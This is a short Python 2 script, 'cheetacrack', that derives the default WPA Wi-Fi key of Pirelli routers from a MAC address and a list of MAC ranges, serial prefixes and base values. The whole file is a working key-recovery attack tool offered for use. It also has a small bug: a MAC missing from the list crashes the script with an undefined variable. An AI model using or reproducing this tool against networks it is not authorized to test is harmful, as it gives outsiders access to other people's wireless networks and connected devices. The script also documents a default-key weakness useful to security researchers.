#   This program is free software; you can redistribute it and/or modify  
#   it under the terms of the GNU General Public License as published by  
#   the Free Software Foundation; either version 2 of the License, or     
#   (at your option) any later version.                                   
                                                                         
#   This program is distributed in the hope that it will be useful,       
#   but WITHOUT ANY WARRANTY; without even the implied warranty of        
#   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the         
#   GNU General Public License for more details.    

import sys
import fileinput

def stampa():
	print "*************************************************"
	print "*                                               *" 
	print "*     Cheetacrack python script                 *"
	print "*     for Pirelli routers                       *"
	print "*                                               *"
	print "*************************************************"
	print ""
	print "usage: python cheetacrack.py <mac_addres> <file_input> "
	print ""
	print "Example: python cheetacrack.py 38:22:9D:A3:00:00 bases.lst"

if(len(sys.argv)>2):
	mac_addr=sys.argv[1] 	
	fin=sys.argv[2]		
	inputmacf6=mac_addr[0:8] 
	inputmacl6=mac_addr[9:17] 
	try:
		for line in fileinput.input(fin):
			filemacf6=line[0:8]			
			filemacfl6=line[9:17]
			filemacll6=line[18:26]
			sn1=line[27:33]
			base=line[34:40]
			inc=line[41]
			testimacl6=mac_addr[9:17]
			if(filemacf6==inputmacf6 and filemacfl6<=inputmacl6<=filemacll6):	
				esito=bool(1)
				testimacl6=testimacl6.replace(':','')
				sn1=sn1.replace(' ','')  
				testimacl6=int(testimacl6,16)
				base=int(base,16)
				inc=int(inc)
				ris=testimacl6-base
				ris=ris/inc
				ris=str(ris)
				cc=len(ris)
				zeros=(7-cc)
				i=0
				while(i<zeros):	
					ris="0"+ris
					i=i+1
				
				print "*********************************"
				print "* Key found:			*"
				print "* MAC =",mac_addr,"	*"
				print "* WPA =",sn1+""+ris,"		*"
				print "*				*"
				print "*********************************"
			
	except IOError:
		print "No such file"
		sys.exit()	
	if(not(esito)):	
		print "Mac is not on the list"
		sys.exit()

else:
	stampa()
